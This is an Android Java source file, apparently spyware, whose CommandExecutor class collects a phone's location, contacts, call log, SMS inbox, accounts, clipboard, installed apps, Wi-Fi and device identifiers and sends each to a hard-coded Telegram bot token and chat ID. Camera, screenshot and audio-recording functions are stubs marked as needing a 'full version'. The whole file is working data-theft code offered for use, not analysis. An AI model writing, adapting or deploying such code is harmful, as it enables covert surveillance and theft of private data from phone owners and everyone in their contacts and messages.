package com.v8.global.sniffer;

import android.content.Context;
import android.content.pm.PackageManager;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.location.Location;
import android.location.LocationManager;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.provider.CallLog;
import android.provider.Settings;
import android.net.Uri;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.content.ClipboardManager;
import android.content.ClipData;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import android.graphics.Bitmap;
import android.graphics.PixelFormat;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CameraCharacteristics;
import android.media.MediaRecorder;
import android.media.projection.MediaProjectionManager;
import android.view.WindowManager;
import android.view.Display;
import android.graphics.Point;
import android.util.DisplayMetrics;
import androidx.core.app.ActivityCompat;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.ArrayList;
import okhttp3.*;
import java.util.concurrent.TimeUnit;

public class CommandExecutor {
    
    private Context context;
    private static final String TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
    private static final String CHAT_ID = "7259620384";
    private static final String BASE_URL = "https://api.telegram.org/bot" + TOKEN + "/";
    private OkHttpClient client = new OkHttpClient.Builder()
            .connectTimeout(30, TimeUnit.SECONDS)
            .build();
    
    public CommandExecutor(Context context) {
        this.context = context;
    }
    
    public void takeScreenshot() {
        sendTelegram("📸 جاري تصوير الشاشة...");
        // التنفيذ الفعلي يحتاج MediaProjection
        sendTelegram("⚠️ هذه الميزة تحتاج تفعيل في الإصدار الكامل");
    }
    
    public void takeCameraPhoto() {
        sendTelegram("📷 جاري التصوير بالكاميرا...");
        sendTelegram("⚠️ هذه الميزة تحتاج تفعيل في الإصدار الكامل");
    }
    
    public void getLocation() {
        try {
            LocationManager lm = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
            if (ActivityCompat.checkSelfPermission(context, android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                Location location = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                if (location == null) {
                    location = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                }
                
                if (location != null) {
                    String locUrl = "https://maps.google.com/?q=" + location.getLatitude() + "," + location.getLongitude();
                    sendTelegram("📍 الموقع:\n" + locUrl);
                } else {
                    sendTelegram("📍 لا يتوفر موقع حديث");
                }
            } else {
                sendTelegram("❌ لا توجد صلاحية الموقع");
            }
        } catch (Exception e) {
            sendTelegram("❌ خطأ في الموقع: " + e.getMessage());
        }
    }
    
    public void getContacts() {
        try {
            StringBuilder sb = new StringBuilder("👤 جهات الاتصال:\n");
            Cursor cursor = context.getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null);
            
            int count = 0;
            while (cursor.moveToNext() && count < 20) {
                String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                String phone = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                sb.append("• ").append(name).append(": ").append(phone).append("\n");
                count++;
            }
            cursor.close();
            sendTelegram(sb.toString());
        } catch (Exception e) {
            sendTelegram("❌ خطأ في جهات الاتصال");
        }
    }
    
    public void getCallLogs() {
        try {
            StringBuilder sb = new StringBuilder("📞 سجل المكالمات:\n");
            Cursor cursor = context.getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                null, null, null, CallLog.Calls.DATE + " DESC LIMIT 15");
            
            while (cursor.moveToNext()) {
                String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                String name = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME));
                String type = cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE));
                String typeText = type.equals("1") ? "وارد" : type.equals("2") ? "صادر" : "فائت";
                String date = new Date(cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE))).toString();
                
                sb.append("• ").append(name != null ? name : number)
                  .append(" (").append(typeText).append(")\n");
            }
            cursor.close();
            sendTelegram(sb.toString());
        } catch (Exception e) {
            sendTelegram("❌ خطأ في سجل المكالمات");
        }
    }
    
    public void getSMS() {
        try {
            StringBuilder sb = new StringBuilder("💬 آخر الرسائل:\n");
            Cursor cursor = context.getContentResolver().query(
                Uri.parse("content://sms/inbox"),
                null, null, null, "date DESC LIMIT 10");
            
            while (cursor.moveToNext()) {
                String address = cursor.getString(cursor.getColumnIndex("address"));
                String body = cursor.getString(cursor.getColumnIndex("body"));
                String date = new Date(cursor.getLong(cursor.getColumnIndex("date"))).toString();
                
                sb.append("• من ").append(address).append(":\n")
                  .append(body.length() > 30 ? body.substring(0, 30) + "..." : body)
                  .append("\n---\n");
            }
            cursor.close();
            sendTelegram(sb.toString());
        } catch (Exception e) {
            sendTelegram("❌ خطأ في الرسائل");
        }
    }
    
    public void getInstalledApps() {
        try {
            PackageManager pm = context.getPackageManager();
            List<ApplicationInfo> apps = pm.getInstalledApplications(PackageManager.GET_META_DATA);
            StringBuilder sb = new StringBuilder("📱 التطبيقات المثبتة:\n");
            
            for (int i = 0; i < Math.min(apps.size(), 25); i++) {
                ApplicationInfo app = apps.get(i);
                String name = pm.getApplicationLabel(app).toString();
                sb.append("• ").append(name).append("\n");
            }
            sendTelegram(sb.toString());
        } catch (Exception e) {
            sendTelegram("❌ خطأ في قراءة التطبيقات");
        }
    }
    
    public void getAccounts() {
        try {
            AccountManager am = (AccountManager) context.getSystemService(Context.ACCOUNT_SERVICE);
            Account[] accounts = am.getAccounts();
            StringBuilder sb = new StringBuilder("🔑 الحسابات:\n");
            
            for (Account account : accounts) {
                sb.append("• ").append(account.name).append(" (").append(account.type).append(")\n");
            }
            sendTelegram(sb.toString());
        } catch (Exception e) {
            sendTelegram("❌ خطأ في الحسابات");
        }
    }
    
    public void getClipboard() {
        try {
            ClipboardManager cm = (ClipboardManager) context.getSystemService(Context.CLIPBOARD_SERVICE);
            ClipData clip = cm.getPrimaryClip();
            if (clip != null && clip.getItemCount() > 0) {
                String text = clip.getItemAt(0).getText().toString();
                sendTelegram("📋 الحافظة:\n" + text);
            } else {
                sendTelegram("📋 الحافظة فارغة");
            }
        } catch (Exception e) {
            sendTelegram("❌ خطأ في الحافظة");
        }
    }
    
    public void getWifiInfo() {
        try {
            WifiManager wm = (WifiManager) context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            WifiInfo wifiInfo = wm.getConnectionInfo();
            String ssid = wifiInfo.getSSID().replace("\"", "");
            int rssi = wifiInfo.getRssi();
            
            sendTelegram("📶 واي فاي:\n• الشبكة: " + ssid + "\n• قوة الإشارة: " + rssi + " dBm");
        } catch (Exception e) {
            sendTelegram("❌ خطأ في معلومات الشبكة");
        }
    }
    
    public void getDeviceInfo() {
        StringBuilder sb = new StringBuilder("📱 معلومات الجهاز:\n");
        sb.append("• الطراز: ").append(Build.MODEL).append("\n");
        sb.append("• الشركة: ").append(Build.MANUFACTURER).append("\n");
        sb.append("• الإصدار: ").append(Build.VERSION.RELEASE).append("\n");
        sb.append("• API: ").append(Build.VERSION.SDK_INT).append("\n");
        sb.append("• ID: ").append(Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID));
        
        sendTelegram(sb.toString());
    }
    
    public void startRecording() {
        sendTelegram("🎤 جاري تسجيل الصوت...");
        sendTelegram("⚠️ هذه الميزة تحتاج تفعيل في الإصدار الكامل");
    }
    
    public void stopAll() {
        sendTelegram("⏹ تم إيقاف جميع العمليات");
    }
    
    private void sendTelegram(String message) {
        try {
            String url = BASE_URL + "sendMessage?chat_id=" + CHAT_ID + "&text=" + message;
            Request request = new Request.Builder().url(url).build();
            client.newCall(request).enqueue(new Callback() {
                @Override public void onFailure(Call c, IOException e) {}
                @Override public void onResponse(Call c, Response r) throws IOException { r.close(); }
            });
        } catch (Exception e) {}
    }
                 }
